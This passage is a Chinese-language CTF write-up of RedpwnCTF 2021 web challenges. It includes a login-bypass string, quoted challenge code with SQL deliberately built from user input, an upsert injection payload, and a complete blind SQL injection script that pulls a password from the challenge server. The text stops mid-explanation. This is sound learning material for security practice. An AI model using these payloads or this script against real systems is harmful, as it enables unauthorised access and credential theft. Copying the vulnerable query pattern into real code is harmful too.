<!doctype html><html lang=en-us>
<head>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<title>AmiaaaZ's Site | RedpwnCTF2021 Wp</title>
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=generator content="Hugo 0.91.2">
<meta name=ROBOTS content="INDEX, FOLLOW">
<link href=/dist/app.css rel=stylesheet>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-203328343-1','auto'),ga('send','pageview'))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous>
<script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script>
<script>(function(f,b){var c=document,d='script',a=c.createElement(d),e=c.getElementsByTagName(d)[0];a.src=f,b&&a.addEventListener('load',function(a){b(a)}),e.parentNode.insertBefore(a,e)})('https://amiaaaz.github.io/lib/pangu.min.js',function(){pangu.spacingPage()})</script>
<style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style>
</head>
<body class="bg-gray-100 text-gray-700 font-sans">
<div class="p-6 sm:p-10 md:p-16 flex flex-wrap">
<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
<div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
<div>
<h2>
<a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a>
</h2>
</div>
<h1 class=pt-2>RedpwnCTF2021 Wp</h1>
<h3 class="text-java-700 font-normal leading-relaxed pt-2">算是第一个自己报名的ctf叭？还挺好玩的，打星号的是没复现的，之后我必回来鞭尸</h3>
<div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light">
<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/ctf>CTF</a>
&nbsp;&nbsp;
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/wp>wp</a>
</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2021-08-08T20:08:39+08:00>2021-8-8 20:08</time>
</div>
<details class=toc open>
<summary>
<hr>
</summary>
<div class="inline toc-content">
<nav id=TableOfContents>
<ul>
<li><a href=#webinspect-me>web/inspect-me</a></li>
<li><a href=#weborm-bad>web/orm-bad</a></li>
<li><a href=#websecure>web/secure</a></li>
<li><a href=#webcool>web/cool</a></li>
<li><a href=#webnotes>web/notes</a></li>
<li><a href=#webrequester>web/Requester</a></li>
<li><a href=#webrequester-strikes-back>web/requester-strikes-back</a></li>
<li><a href=#webpastebin-1>web/pastebin-1</a></li>
<li><a href=#webpastebin-2-social-edition>***web/pastebin-2-social-edition</a></li>
<li><a href=#webpastebin-3>***web/pastebin-3</a></li>
<li><a href=#webwtjs>web/wtjs</a></li>
<li><a href=#webmdbin>***web/MdBin</a></li>
<li><a href=#weblazy-admin>***web/lazy-admin</a></li>
<li><a href=#miscsanity-check>misc/sanity-check</a></li>
<li><a href=#miscdiscord>misc/discord</a></li>
<li><a href=#misccompliant-lattice-feline>misc/compliant-lattice-feline</a></li>
<li><a href=#miscthe-substitution-game>*misc/the-substitution-game</a></li>
<li><a href=#miscannabel-lee>misc/annaBEL-lee</a></li>
<li><a href=#cryptoscissor>crypto/scissor</a></li>
<li><a href=#cryptobaby>crypto/baby</a></li>
<li><a href=#revwstrings>rev/wstrings</a></li>
<li><a href=#revbread-making>rev/bread-making</a></li>
<li><a href=#后记>后记</a></li>
</ul>
</nav>
</div>
</details>
<hr>
</div>
</header>
<main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
<article>
<section class="mx-auto content">
<div class=c-rich-text><p>官方的docker地址~~复现一本满足~<a href=https://github.com/redpwn/redpwnctf-2021-challenges>https://github.com/redpwn/redpwnctf-2021-challenges</a></p>
<h2 id=webinspect-me>web/inspect-me</h2>
<blockquote>
<p>See if you can find the flag in the source code!</p>
<p><a href=https://inspect-me.mc.ax/>inspect-me.mc.ax</a></p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092212510.png alt=image-20210710092212510></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092254315.png alt=image-20210710092254315></p>
<h2 id=weborm-bad>web/orm-bad</h2>
<blockquote>
<p>I just learned about orms today! They seem kinda difficult to implement though&mldr; Guess I&rsquo;ll stick to good old raw sql statements!</p>
<p><a href=https://orm-bad.mc.ax/>orm-bad.mc.ax</a></p>
<p>Downloads - <a href=https://static.redpwn.net/uploads/eb4c66c15fe3013340068ef0a34bd5dd5c0c98c567fac53b158d56afe07b511c/app.js>app.js</a></p>
</blockquote>
<p>万能密码：admin&rsquo;or'1 : admin</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092643161.png alt=image-20210710092643161></p>
<p>关于orm 之后要补一下知识：<a href=https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping>Object–relational mapping</a> <a href=http://www.ruanyifeng.com/blog/2019/02/orm-tutorial.html>ORM 实例教程</a></p>
<h2 id=websecure>web/secure</h2>
<blockquote>
<p>Just learned about encryption—now, my website is unhackable!</p>
<p><a href=https://secure.mc.ax/>secure.mc.ax</a></p>
<p>Downloads - <a href=https://static.redpwn.net/uploads/210a9fe526e420576e4b6c1cb74eeed437c1a89955c8158c14aa365c45578200/index.js>index.js</a></p>
</blockquote>
<p>还是个登录框，尝试万能密码</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710094442324.png alt=image-20210710094442324></p>
<p>源码是这样的</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>const</span> <span style=color:#75af00>crypto</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;crypto&#39;</span><span style=color:#111>);</span>
<span style=color:#00a8c8>const</span> <span style=color:#75af00>express</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express&#39;</span><span style=color:#111>);</span>

<span style=color:#00a8c8>const</span> <span style=color:#75af00>db</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;better-sqlite3&#39;</span><span style=color:#111>)(</span><span style=color:#d88200>&#39;db.sqlite3&#39;</span><span style=color:#111>);</span>
<span style=color:#75af00>db</span><span style=color:#111>.</span><span style=color:#75af00>exec</span><span style=color:#111>(</span><span style=color:#d88200>`DROP TABLE IF EXISTS users;`</span><span style=color:#111>);</span>
<span style=color:#75af00>db</span><span style=color:#111>.</span><span style=color:#75af00>exec</span><span style=color:#111>(</span><span style=color:#d88200>`CREATE TABLE users(
</span><span style=color:#d88200>    id INTEGER PRIMARY KEY AUTOINCREMENT,
</span><span style=color:#d88200>    username TEXT,
</span><span style=color:#d88200>    password TEXT
</span><span style=color:#d88200>);`</span><span style=color:#111>);</span>
<span style=color:#75af00>db</span><span style=color:#111>.</span><span style=color:#75af00>exec</span><span style=color:#111>(</span><span style=color:#d88200>`INSERT INTO users (username, password) VALUES (
</span><span style=color:#d88200>    &#39;</span><span style=color:#d88200>${</span><span style=color:#75af00>btoa</span><span style=color:#111>(</span><span style=color:#d88200>&#39;admin&#39;</span><span style=color:#111>)</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;,
</span><span style=color:#d88200>    &#39;</span><span style=color:#d88200>${</span><span style=color:#75af00>btoa</span><span style=color:#111>(</span><span style=color:#75af00>crypto</span><span style=color:#111>.</span><span style=color:#75af00>randomUUID</span><span style=color:#111>)</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;
</span><span style=color:#d88200>)`</span><span style=color:#111>);</span>

<span style=color:#00a8c8>const</span> <span style=color:#75af00>app</span> <span style=color:#f92672>=</span> <span style=color:#75af00>express</span><span style=color:#111>();</span>

<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span>
  <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;body-parser&#39;</span><span style=color:#111>).</span><span style=color:#75af00>urlencoded</span><span style=color:#111>({</span>
    <span style=color:#75af00>extended</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>false</span><span style=color:#111>,</span>
  <span style=color:#111>})</span>
<span style=color:#111>);</span>

<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>post</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/login&#39;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
  <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>body</span><span style=color:#111>.</span><span style=color:#75af00>username</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>body</span><span style=color:#111>.</span><span style=color:#75af00>password</span><span style=color:#111>)</span>
    <span style=color:#00a8c8>return</span> <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>redirect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/?message=Username and password required!&#39;</span><span style=color:#111>);</span>

  <span style=color:#00a8c8>const</span> <span style=color:#75af00>query</span> <span style=color:#f92672>=</span> <span style=color:#d88200>`SELECT id FROM users WHERE
</span><span style=color:#d88200>          username = &#39;</span><span style=color:#d88200>${</span><span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>body</span><span style=color:#111>.</span><span style=color:#75af00>username</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39; AND
</span><span style=color:#d88200>          password = &#39;</span><span style=color:#d88200>${</span><span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>body</span><span style=color:#111>.</span><span style=color:#75af00>password</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;;`</span><span style=color:#111>;</span>
  <span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
    <span style=color:#00a8c8>const</span> <span style=color:#75af00>id</span> <span style=color:#f92672>=</span> <span style=color:#75af00>db</span><span style=color:#111>.</span><span style=color:#75af00>prepare</span><span style=color:#111>(</span><span style=color:#75af00>query</span><span style=color:#111>).</span><span style=color:#75af00>get</span><span style=color:#111>()</span><span style=color:#f92672>?</span><span style=color:#111>.</span><span style=color:#75af00>id</span><span style=color:#111>;</span>

    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>id</span><span style=color:#111>)</span> <span style=color:#00a8c8>return</span> <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>redirect</span><span style=color:#111>(</span><span style=color:#d88200>`/?message=</span><span style=color:#d88200>${</span><span style=color:#75af00>process</span><span style=color:#111>.</span><span style=color:#75af00>env</span><span style=color:#111>.</span><span style=color:#75af00>FLAG</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>);</span>
    <span style=color:#00a8c8>else</span> <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Error</span><span style=color:#111>(</span><span style=color:#d88200>&#39;Incorrect login&#39;</span><span style=color:#111>);</span>
  <span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>{</span>
    <span style=color:#00a8c8>return</span> <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>redirect</span><span style=color:#111>(</span>
      <span style=color:#d88200>`/?message=Incorrect username or password. Query: </span><span style=color:#d88200>${</span><span style=color:#75af00>query</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span>
    <span style=color:#111>);</span>
  <span style=color:#111>}</span>
<span style=color:#111>});</span>
</code></pre></div><p>他这个b64加密是发生在前端的，也就是在发包的时候就已经对post的数据进行了预处理，而具体到后端进行sql语句的查询时会直接拼接req.body.username/passwd的数据，不会进行进一步的检查或过滤</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710104923251.png alt=image-20210710104923251></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710104859539.png alt=image-20210710104859539></p>
<p>刚开始想复杂了</p>
<h2 id=webcool>web/cool</h2>
<blockquote>
<p>Aaron has a message for the cool kids. For support, DM BrownieInMotion.</p>
<p><a href=https://cool.mc.ax/>cool.mc.ax</a></p>
<p>Downloads - <a href=https://static.redpwn.net/uploads/e03916d52bb7e84cbd2f9f26e5de162fdd0442c40d8397a103aab5813031fd83/app.py>app.py</a></p>
</blockquote>
<p>登录框，可以注册 先尝试test: test 登录成功但是无法获取信息（注册后也会跳转这个页面</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710105453861.png alt=image-20210710105453861></p>
<p>留意cookie部分，是熟悉的flask session，扔进工具里解密</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710105534823.png alt=image-20210710105534823></p>
<p>再参考源码中的/message部分，考虑将session设为{&ldquo;username&rdquo;:&ldquo;ginkoid&rdquo;}后登入查看信息（开始以为是session伪造 后来发现不是）</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710113131546.png alt=image-20210710113131546></p>
<p>看一下其他部分的源码，首先是init()</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#00a8c8>def</span> <span style=color:#75af00>init</span><span style=color:#111>():</span>
    <span style=color:#75715e># this is terrible but who cares</span>
    <span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;&#39;&#39;
</span><span style=color:#d88200>        CREATE TABLE IF NOT EXISTS users (
</span><span style=color:#d88200>            username TEXT PRIMARY KEY,
</span><span style=color:#d88200>            password TEXT
</span><span style=color:#d88200>        );
</span><span style=color:#d88200>    &#39;&#39;&#39;</span><span style=color:#111>)</span>
    <span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;DROP TABLE users;&#39;</span><span style=color:#111>)</span>
    <span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;&#39;&#39;
</span><span style=color:#d88200>        CREATE TABLE users (
</span><span style=color:#d88200>            username TEXT PRIMARY KEY,
</span><span style=color:#d88200>            password TEXT
</span><span style=color:#d88200>        );
</span><span style=color:#d88200>    &#39;&#39;&#39;</span><span style=color:#111>)</span>

    <span style=color:#75715e># put ginkoid into db</span>
    <span style=color:#111>ginkoid_password</span> <span style=color:#f92672>=</span> <span style=color:#111>generate_token</span><span style=color:#111>()</span>
    <span style=color:#111>execute</span><span style=color:#111>(</span>
        <span style=color:#d88200>&#39;INSERT OR IGNORE INTO users (username, password)&#39;</span>
        <span style=color:#d88200>f</span><span style=color:#d88200>&#39;VALUES (</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>ginkoid</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>, </span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>{</span><span style=color:#111>ginkoid_password</span><span style=color:#d88200>}</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>);&#39;</span>
    <span style=color:#111>)</span>
    <span style=color:#111>execute</span><span style=color:#111>(</span>
        <span style=color:#d88200>f</span><span style=color:#d88200>&#39;UPDATE users SET password=</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>{</span><span style=color:#111>ginkoid_password</span><span style=color:#d88200>}</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>&#39;</span>
        <span style=color:#d88200>f</span><span style=color:#d88200>&#39;WHERE username=</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>ginkoid</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>;&#39;</span>
    <span style=color:#111>)</span>
</code></pre></div><p>然后是在创建用户<code>create_user()</code>和登录<code>check_login()</code>时都会检测用户名中是否有非法字符（白名单是26个英文字母大小写和数字），算是挺严格的</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#00a8c8>def</span> <span style=color:#75af00>create_user</span><span style=color:#111>(</span><span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#111>password</span><span style=color:#111>):</span>
    <span style=color:#00a8c8>if</span> <span style=color:#111>any</span><span style=color:#111>(</span><span style=color:#111>c</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> <span style=color:#111>allowed_characters</span> <span style=color:#00a8c8>for</span> <span style=color:#111>c</span> <span style=color:#f92672>in</span> <span style=color:#111>username</span><span style=color:#111>):</span>
        <span style=color:#00a8c8>return</span> <span style=color:#111>(</span><span style=color:#00a8c8>False</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;Alphanumeric usernames only, please.&#39;</span><span style=color:#111>)</span>
    <span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>username</span><span style=color:#111>)</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1</span><span style=color:#111>:</span>
        <span style=color:#00a8c8>return</span> <span style=color:#111>(</span><span style=color:#00a8c8>False</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;Username is too short.&#39;</span><span style=color:#111>)</span>
    <span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>password</span><span style=color:#111>)</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>50</span><span style=color:#111>:</span>
        <span style=color:#00a8c8>return</span> <span style=color:#111>(</span><span style=color:#00a8c8>False</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;Password is too long.&#39;</span><span style=color:#111>)</span>
    <span style=color:#111>other_users</span> <span style=color:#f92672>=</span> <span style=color:#111>execute</span><span style=color:#111>(</span>
        <span style=color:#d88200>f</span><span style=color:#d88200>&#39;SELECT * FROM users WHERE username=</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>{</span><span style=color:#111>username</span><span style=color:#d88200>}</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>;&#39;</span>
    <span style=color:#111>)</span>
    <span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>other_users</span><span style=color:#111>)</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span><span style=color:#111>:</span>
        <span style=color:#00a8c8>return</span> <span style=color:#111>(</span><span style=color:#00a8c8>False</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;Username taken.&#39;</span><span style=color:#111>)</span>
    <span style=color:#111>execute</span><span style=color:#111>(</span>
        <span style=color:#d88200>&#39;INSERT INTO users (username, password)&#39;</span>
        <span style=color:#d88200>f</span><span style=color:#d88200>&#39;VALUES (</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>{</span><span style=color:#111>username</span><span style=color:#d88200>}</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>, </span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>{</span><span style=color:#111>password</span><span style=color:#d88200>}</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>);&#39;</span> <span style=color:#75715e># passwd部分可控</span>
    <span style=color:#111>)</span>
    <span style=color:#00a8c8>return</span> <span style=color:#111>(</span><span style=color:#00a8c8>True</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>)</span>
</code></pre></div><p>考虑了一下二次注入，因为注册时的passwd部分完全可控，设想是这样的</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710122622508.png alt=image-20210710122622508></p>
<p>构造passwd部分为 <code>'),('ginkoid','passwd</code></p>
<p>emmmm 但是这里不管是明文还是url encode都会有500错误，而且这里返回的时<code>correct_password[0][0]==password</code>，也算是杜绝了这种多添加一条信息的可能，之前已经初始化的密码会是<code>[0][0]</code>，而新插入的passwd将是<code>[1][0]</code>；并且在<code>init()</code>时定义username是primary 也不可能有重复的</p>
<p>————比赛的时候就停到这里了，也是当时了解的太少，思路很容易就断掉了。。。以下是复现</p>
<p>在看了<a href=https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md>这篇wp</a>之后，发现这位师傅最开始跟我的思路是一样的 都想利用insert那一句，都想替换掉数据库中原来存有的ginkoid的密码；这位师傅用的payload是</p>
<pre tabindex=0><code>'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';--
</code></pre><p>其中的<code>ON CONFLICT DO UPDATE SET</code>，在<a href=https://www.sqlite.org/lang_UPSERT.html>这篇官方文档</a>里写的很详细，这位师傅给的payload很好（我当时则对这个sql语句并不清楚）但是正如他所说的，which is 8 characters over the limit, which won&rsquo;t do.</p>
<p>最后使用盲注的方式，先上一下脚本 （<a href=https://github.com/SuperStormer/writeups/blob/master/redpwnctf_2021/web/cool.py>这里是来源</a>）再说说思路</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>time</span>
<span style=color:#f92672>import</span> <span style=color:#111>requests</span>
<span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;https://cool.mc.ax/&#34;</span>
<span style=color:#75715e># url = &#34;http://127.0.0.1:5000/&#34;</span>

<span style=color:#111>prefix</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;asdfjwfoijweoijfojiewfj&#34;</span>
<span style=color:#111>charset</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&#34;</span>
<span style=color:#111>val</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;</span>
<span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>32</span><span style=color:#111>):</span>
    <span style=color:#111>username</span> <span style=color:#f92672>=</span> <span style=color:#111>prefix</span> <span style=color:#f92672>+</span> <span style=color:#111>str</span><span style=color:#111>(</span><span style=color:#111>time</span><span style=color:#f92672>.</span><span style=color:#111>time_ns</span><span style=color:#111>())</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;0&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#111>)</span>	<span style=color:#75715e># 注意白名单里没有0 要换掉</span>
    <span style=color:#111>password</span> <span style=color:#f92672>=</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#34;&#39;||(select substr(password,</span><span style=color:#d88200>{</span><span style=color:#111>i</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span><span style=color:#d88200>}</span><span style=color:#d88200>,1) from users)||&#39;&#34;</span>
    <span style=color:#111>resp</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>post</span><span style=color:#111>(</span><span style=color:#111>url</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;register&#34;</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#111>{</span><span style=color:#d88200>&#34;username&#34;</span><span style=color:#111>:</span> <span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;password&#34;</span><span style=color:#111>:</span> <span style=color:#111>password</span><span style=color:#111>})</span><span style=color:#f92672>.</span><span style=color:#111>text</span>
    <span style=color:#00a8c8>for</span> <span style=color:#111>c</span> <span style=color:#f92672>in</span> <span style=color:#111>charset</span><span style=color:#111>:</span>
        <span style=color:#111>resp</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>post</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#111>{</span><span style=color:#d88200>&#34;username&#34;</span><span style=color:#111>:</span> <span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;password&#34;</span><span style=color:#111>:</span> <span style=color:#111>c</span><span style=color:#111>})</span><span style=color:#f92672>.</span><span style=color:#111>text</span>
        <span style=color:#00a8c8>if</span> <span style=color:#d88200>&#34;Incorrect&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> <span style=color:#111>resp</span><span style=color:#111>:</span>
            <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>c</span><span style=color:#111>)</span>
            <span style=color:#111>val</span> <span style=color:#f92672>+=</span> <span style=color:#111>c</span>
            <span style=color:#00a8c8>break</span>
<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>val</span><span style=color:#111>)</span>
</code></pre></div><p>注入点仍然是上文提到的<code>/register</code>路由中<code>create_user(username,password)</code>（当时找对了注入点，但是盲注这块还是做的少）</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806085327316.png alt=image-20210806085327316></p>
<p>主要的payload是</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>password</span> <span style=color:#f92672>=</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#34;&#39;||(select substr(password,</span><span style=color:#d88200>{</span><span style=color:#111>i</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span><span style=color:#d88200>}</span><span style=color:#d88200>,1) from users)||&#39;&#34;</span>
</code></pre></div><p>这一句，当进入到注册流程时 会执行</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>excute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;INSERT INTO users (username, password)&#39;</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;VALUES (</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>{</span><span style=color:#111>username</span><span style=color:#d88200>}</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>, </span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>{</span><span style=color:#111>password</span><span style=color:#d88200>}</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>);&#39;</span><span style=color:#111>)</span>
</code></pre></div><p>即</p>
